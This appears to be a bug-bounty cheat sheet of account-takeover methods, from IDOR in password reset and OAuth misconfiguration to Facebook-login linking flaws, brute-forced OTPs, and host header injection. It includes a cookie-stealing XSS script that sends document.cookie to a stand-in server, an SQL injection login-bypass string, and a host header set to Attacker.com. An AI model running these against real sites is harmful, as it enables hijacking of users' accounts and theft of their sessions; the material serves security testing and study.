7 shockingly easy ways to perform account takeover üëá

##### 1. Account takeover via IDOR in password reset:
```powershell
Eg. When user_id (or email) is visible in the POST request.
Just simply change the user_id (or email) from yours to someone else in POST request, if there exists this vulnerability, the password of the victim account will get changed.
```

##### 2. Account Takeover by OAuth Misconfiguration: 
```powershell
Go to https://target.com/signup/ and signup using the unregistered victim‚Äôs account. After the sometime victim is going to signup using the OAuth method.
What happens here is, now the attacker can easily log in using the victim‚Äôs account which bypasses the verification methods.
```
##### 3. Unicode Normalization Issue:
```powershell
Attackers can enter a specially constructed Unicode string that resembles the legal string but contains different Unicode characters.
The system is unable to differentiate between the two strings, allowing the attacker to get around security and access the victim's account.
```
##### 4. Account Takeover by broken cryptography:
```powershell
Create two accounts on the website, request a password for account 1 and capture the request and send it to the intruder and server. You will receive the reset link, try to decode the string.
Now, try to make the token for account 2, if you are able to do this, you will be able to reset the password for account 2.
```
##### 5. Response Manipulation: 
```powershell
Change the HTTP code from  HTTP/1.1 401 Unauthorized To HTTP/1.1 200 OK and the response value from {‚Äúcode‚Äù:‚Äùinvalid_credentials‚Äù} to {‚Äúverify‚Äù : ‚Äùtrue‚Äù}.

This works when JSON is being used to transfer and receive data.
```

##### 6. Account Takeover via Host Header Injection:
```powershell
In a typical HTTP request, the ‚ÄúHost‚Äù header specifies the domain name or IP address of the server the client wants to communicate with.
An attacker with the ability to control or influence the ‚ÄúHost‚Äù header can change it to a different domain, potentially one they control.
```
##### 7. Account Takeover Via HTTP Request Smuggling
```powershell
HTTP request smuggling is an attack in which an attacker interferes with the processing of a sequence of HTTP requests that a web application receives from one or more users.
Use smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE).
```
<br>
<hr>

##### 8. OAuth Misconfiguration Lead To Account Takeover:

```powershell
Steps to Reproduce
Go to https://www.pinterest.com/ and signup using the unregistered victim‚Äôs account.
After the sometime victim is going to signup using the OAuth method.
What happens here is, now the victim can easily log in using the victim‚Äôs account which bypasses the verification methods.
```

##### 9. Stealing Users OAuth authorization code via redirect_uri:
```powershell
An open redirect vulnerability in the redirect_uri parameter will allow the attacker to direct the user to the attacker created page and it will also leak the user authorization code to the attacker.
```

##### 10. XSS in redirect implementation:
```powershell
Sometimes XSS payload in the redirect_uri will lead to XSS attack. It might be possible that the redirect URL is being reflected in the response of the server after the user authenticates, being vulnerable to XSS.
```

##### 11. CSRF - Improper handling of state parameter:
```powershell
The attack arises due to the lack of using Anti-CSRF mechanism like *State* parameters. Very often, the state parameter is completely omitted or used in the wrong way.
If a state parameter is nonexistent, or a static value that never changes, the OAuth flow will very likely be vulnerable to CSRF.
```
##### 12. Everlasting Authorization Code:
```
The authorization code should live just for some time to limit the time window where an attacker can steal and use it. 

Check if you are able to use the authorization code or auth link for an extended period of time.
```
###### With that, here are some must read reports on OAuth bugsüëá

‚û°Ô∏è https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1
‚û°Ô∏è https://hackerone.com/reports/1861974
##



```powershell
üîêSecrets no one will share with you - Here's a technique that might grant you access to takeover other users' accounts using "Login with Facebook":

Are you working on a target site that supports "Login with Facebook"?

Disable email sharing during Facebook login and be ready for unusual design flows that could enable you to take over other users' accounts.

Here's how to disable email sharing when using "Login with Facebook": 

1Ô∏è‚É£ Log in with Facebook on any app. 
2Ô∏è‚É£ Click "Edit Access." 
3Ô∏è‚É£ Uncheck the email address checkbox. 
4Ô∏è‚É£ Click Continue.

Here are some scenarios of account takeovers I've reported based on different target app behaviors:

Account Takeover via Linking Facebook Flow: 
1Ô∏è‚É£ Went to http://example[.]com, used "Login with Facebook" (Uncheck share email on Facebook).

2Ô∏è‚É£ The target site asked to enter an email to link my FB account as no email was shared from FB. Entered victim@example.com, a confirmation link was sent to the victim's email to bind the account.  

3Ô∏è‚É£ Repeated the same steps on the target site using the same FB account, this time choose to link attacker@example.com on target site ‚Äì received the same link as step (2) on the attacker controlled email!  

4Ô∏è‚É£ Knowing this, repeated the same steps again to link victim@example.com, and used earlier link which was received on attacker@example.com to takeover victim@example.com account.

Direct Account Takeover via Login with Facebook: 
1Ô∏è‚É£ Went to http://example[.]com, used "Login with Facebook" (Uncheck share email on Facebook).

2Ô∏è‚É£ The target site prompted me to enter an email to link the FB account to an existing account since no email was shared from FB. Entered victim@example.com. It directly logged me into victim@example.com without any further verification, leading to a complete account takeover.

Pre-Account Takeovers: 
Do you have a target app that heavily relies on a user's email domain to grant access to organizations or critical features based on whitelisted domains? Using this technique can help you bypass email verification requirements, allowing you to claim any email. Consequently, you may be able to access critical features of other organizations permitted for emails with the same domain.

Lesson: Always test unusual login flows by logging in with a 3rd party provider without sharing email with the target site. These designs can be flawed and lead to nice bounties! üí∞ #BugBounty #CyberSecurity #HackerOne #bugcrowd #securitytips #bugbountytips
```

[ ] **a lot of ideas in this article by omar hashem**
```
https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5
```
[ ] **OAuth to Account takeover**
```
https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
```


[ ] **Pre-Account Takeover**                                                  

A pre-account takeover occurs when an attacker creates a user account using one signup method and the victim creates another account using a different signup method using the same email address. Because the email addresses are the same, the application connects the two accounts. when the app is unable to validate email addresses.
```
How to hunt :-
    Try registering any email address without verifying it.
    Try registering an account again, but this time with a different method, such as ‚Äòsign up with Google‚Äô from same email address.
    Due to the fact that both email addresses are the same, the web application will link the two accounts.
    Now try logging in using the specified password and username. Check to see whether you can see information from that account that was retrieved via Google.
```


[ ] **Account takeover due to Improper Rate limit**
```
How to Hunt:-

    capture the request at the login page, while providing username and password.
    send it to intruder and Brute force it.
    Analyze the response and length.
```


[ ] **Account takeover by utilizing sensitive data exposure**
```
Sensitive data exposure occurs when a web application failed to properly protect confidential information, resulting in the disclosure of sensitive information or data about users, or anything related to them, to a third party.

Occasionally, the application displays unnecessary data, such as valid OTPs, hashes, or passwords, over the request and response parts. So it‚Äôs a good idea to pay attention to the response and request portions.
```


[ ] **login**                                                                                                                                 
```
1. check if you are able to brute force the password
2. Test for OAuth misconfigurations
3. check if you are able to bruteforce the login OTP
4. check for JWT mesconfigurations
5. Test for SQL injection to bypass authentication ```admin" or 1=1;--```
6. check if the application validates the OTP or Token
```


[ ] **password reset**
```
1. check if you are able to brute force the password reset OTP
2. test for token predectability
3. test for JWT misconfigurations
4. check if the password reset endpoint is vulnerable to IDOR
5. check if the password reset endpoint is vulnerable to Host Header injection
6. check if the password reset endpoint is leaking the token or OTP in the HTTP response
7. check if the application validates the OTP or Token
8. test for HTTP parameter Pollution (HPP)
    
```


[ ] **XSS to Account Takeover**

if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password       
```
1. try to exfiltrate the cookies
2. try to exfiltrate the Auth Token
3. if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies
    - PoC Example:
        ```html
        
        <script>
            /*
            this script will create a hidden <img> element
            when the browser tries to load the image
            the victim's cookies will be sent to your server
            */

            var new_img = document.createElement('img');
            new_img.src = "http://yourserver/" + document.cookie;
            new_img.style = 'display: none;'
            document.body.appendChild(new_img);
        </script>

        ```
```


[ ] **CSRF to Account Takeover**
```
1. check if the email update endpoint is vulnerable to CSRF
2. check if the password change endpoint is vulnerable to CSRF
```


[ ] **IDOR to Account Takerover**
```
1. checck if the email update endpoint is vulnerable to IDOR
2. check if the password change endpoint is vulnerable to IDOR
3. check if the password reset endpoint vulnerable to IDOR
```


[ ] **Account takeover by Response & Status code Manipulation**


[ ] **Account takeover by exploiting Weak cryptography**
```
check this
https://infosecwriteups.com/weak-cryptography-in-password-reset-to-full-account-takeover-fc61c75b36b9
```


[ ] **Password or email change function**
```
IF you try to change password and see email parameter in password change request, Try changing your email to victim email
```


[ ] **Sing-Up Function**
```
IF you try to sing-up new account in target site, in email filed try set target email

IF you try to sing-up new account in target site using 3rd party, in 3d party use phone number instead email then link 3rd account with target site.Then Go setting try link victim email in you account
```

[ ] **Rest Token**
```
Try to use your REST Token with Target account. Hint: email=Target@email.com&code=$Attacker_TOKEN$

Brute Force Rest Token if it is numeric. Hint : email=Target@email.com&code=$TOKEN$

Try to figure out how the token are generated: 1. Generated based on TimeStamp OR ID of user OR email of user
```

[ ] **Host Header Injection**
```
when send rest account request intercept POST Request and Change Host header value from target.site TO Attacker.com: Hint POST /PassRest HTTP1/1 Host: Attacker.com
```

[ ] **CORS Misconfiguration to Account Takeover**

If the page contains CORS missconfigurations you might be able to steal sensitive information from the user to takeover his account or make him change auth information for the same purpose:
```
https://book.hacktricks.xyz/pentesting-web/cors-bypass
```
[ ] **Account takeover via leaked session cookie**
```
https://hackerone.com/reports/745324
```
[ ] **HTTP Request Smuggling to ATO**
```
https://hackerone.com/reports/737140
https://hackerone.com/reports/740037
```

[ ] **Bypassing Digits origin validation which leads to account takeover**
```
https://hackerone.com/reports/129873
```
[ ] Top ATO report in hackerone
```
https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
```
